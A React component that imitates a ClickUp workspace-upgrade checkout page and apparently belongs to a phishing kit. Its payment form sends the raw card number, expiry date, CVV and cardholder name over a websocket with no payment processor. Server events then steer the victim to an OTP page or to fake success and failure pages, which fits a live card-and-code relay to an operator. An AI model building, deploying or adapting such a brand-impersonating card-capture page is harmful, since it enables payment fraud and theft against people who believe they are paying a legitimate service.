import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Check, Lock } from 'lucide-react';
import { ClipLoader } from 'react-spinners';
import { socket } from '../socket';

function PaymentPage() {
  const navigate = useNavigate();
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardholderName, setCardholderName] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [formDisabled, setFormDisabled] = useState(false);

  useEffect(() => {
    socket.connect();

    socket.on('show_otp', () => {
      navigate('/otp');
    });

    socket.on('payment_success', (data) => {
      navigate('/success', { state: { paymentData: data } });
    });

    socket.on('payment_failed', () => {
      navigate('/failure');
    });

    return () => {
      socket.off('show_otp');
      socket.off('payment_success');
      socket.off('payment_failed');
      socket.disconnect();
    };
  }, [navigate]);

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, '');
    const groups = digits.match(/.{1,4}/g) || [];
    return groups.join(' ').substr(0, 19);
  };

  const formatExpiryDate = (value: string) => {
    const digits = value.replace(/\D/g, '');
    if (digits.length >= 2) {
      return digits.slice(0, 2) + '/' + digits.slice(2, 4);
    }
    return digits;
  };

  const getCardType = (number: string) => {
    const firstDigit = number.replace(/\D/g, '').charAt(0);
    switch (firstDigit) {
      case '4': return 'visa';
      case '5': return 'mastercard';
      case '6': return 'discover';
      case '3': return 'amex';
      default: return null;
    }
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setCardNumber(formatted);
  };

  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiryDate(e.target.value);
    setExpiryDate(formatted);
  };

  const handlePayment = () => {
    setIsProcessing(true);
    setFormDisabled(true);

    const paymentData = {
      cardNumber,
      expiryDate,
      cvv,
      cardholderName,
      timestamp: new Date().toISOString()
    };

    socket.emit('payment_submitted', paymentData);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
      <div className="max-w-4xl w-full bg-white rounded-lg shadow-lg p-8">
        <div className="grid md:grid-cols-2 gap-8">
          <div>
            <h1 className="text-3xl font-bold mb-6">ClickUp</h1>
            <h2 className="text-2xl mb-6">Order Summary</h2>
            
            {/* Workspace Info */}
            <div className="mb-6">
              <p className="text-gray-600">Upgrading Workspace:</p>
              <div className="flex items-center gap-2 mt-2">
                <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center text-white">O</div>
                <span>O's Workspace</span>
              </div>
            </div>

            {/* Billing Plan */}
            <div className="mb-6">
              <h3 className="text-xl mb-4">Billing plan</h3>
              <div className="grid grid-cols-2 gap-4">
                <div className="border-2 border-purple-500 rounded-lg p-4 relative">
                  <div className="absolute top-2 right-2 text-sm bg-green-500 text-white px-2 py-1 rounded">-45%</div>
                  <div className="text-center">
                    <p className="text-sm text-gray-500">Billed Yearly</p>
                    <p className="text-3xl font-bold">$5</p>
                    <p className="text-xs text-gray-500">MEMBER PER MONTH</p>
                  </div>
                </div>
                <div className="border-2 border-gray-200 rounded-lg p-4 opacity-50">
                  <div className="text-center">
                    <p className="text-sm text-gray-500">Billed Monthly</p>
                    <p className="text-3xl font-bold">$9</p>
                    <p className="text-xs text-gray-500">MEMBER PER MONTH</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Payment Details */}
            <div className="mb-6">
              <div className="flex justify-between items-center mb-4">
                <h3 className="text-xl">Payment details</h3>
                <Lock className="text-gray-400" size={20} />
              </div>
              
              <div className="space-y-4">
                <div className="relative">
                  <input
                    type="text"
                    placeholder="Card Number"
                    value={cardNumber}
                    onChange={handleCardNumberChange}
                    className="w-full p-3 border rounded-lg"
                    maxLength={19}
                    disabled={formDisabled}
                  />
                  {getCardType(cardNumber) && (
                    <img
                      src={`/card-logos/${getCardType(cardNumber)}.svg`}
                      alt="Card type"
                      className="absolute right-3 top-1/2 transform -translate-y-1/2 h-6"
                    />
                  )}
                </div>
                
                <div className="grid grid-cols-2 gap-4">
                  <input
                    type="text"
                    placeholder="MM/YY"
                    value={expiryDate}
                    onChange={handleExpiryDateChange}
                    className="p-3 border rounded-lg"
                    maxLength={5}
                    disabled={formDisabled}
                  />
                  <input
                    type="text"
                    placeholder="CVV"
                    value={cvv}
                    onChange={(e) => setCvv(e.target.value)}
                    className="p-3 border rounded-lg"
                    maxLength={4}
                    disabled={formDisabled}
                  />
                </div>
                
                <input
                  type="text"
                  placeholder="Cardholder Name"
                  value={cardholderName}
                  onChange={(e) => setCardholderName(e.target.value)}
                  className="w-full p-3 border rounded-lg"
                  disabled={formDisabled}
                />
              </div>
            </div>

            <button
              onClick={handlePayment}
              disabled={isProcessing}
              className={`w-full py-3 rounded-lg flex items-center justify-center gap-2 ${
                isProcessing ? 'bg-purple-300' : 'bg-purple-500 hover:bg-purple-600'
              } text-white font-medium transition-colors`}
            >
              {isProcessing ? (
                <>
                  <ClipLoader size={20} color="#ffffff" />
                  <span>Processing...</span>
                </>
              ) : (
                'Make Payment'
              )}
            </button>
          </div>

          <div className="space-y-8">
            <div>
              <h3 className="text-2xl mb-4">Unlimited</h3>
              <ul className="space-y-3">
                <li className="flex items-center gap-2">
                  <Check className="text-green-500" size={20} />
                  <span>Unlimited Storage</span>
                </li>
                <li className="flex items-center gap-2">
                  <Check className="text-green-500" size={20} />
                  <span>Unlimited Folders and Spaces</span>
                </li>
                <li className="flex items-center gap-2">
                  <Check className="text-green-500" size={20} />
                  <span>Advanced Reporting</span>
                </li>
              </ul>
            </div>

            <div>
              <h3 className="text-2xl">Trusted by more than 200,000 Teams globally</h3>
              <div className="grid grid-cols-3 gap-4 mt-6">
                <img src="https://example.com/trust-logo1.png" alt="Trust badge" className="h-12 object-contain" />
                <img src="https://example.com/trust-logo2.png" alt="Trust badge" className="h-12 object-contain" />
                <img src="https://example.com/trust-logo3.png" alt="Trust badge" className="h-12 object-contain" />
              </div>
            </div>

            <div>
              <h3 className="text-xl font-semibold mb-4">We accept the following cards</h3>
              <img
                src="https://www.discoversignage.com/uploads/18-05-22_02:15_7-Logo_US_Standard_new_visa_RGB.jpg"
                alt="Accepted cards"
                className="h-8 object-contain"
              />
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default PaymentPage;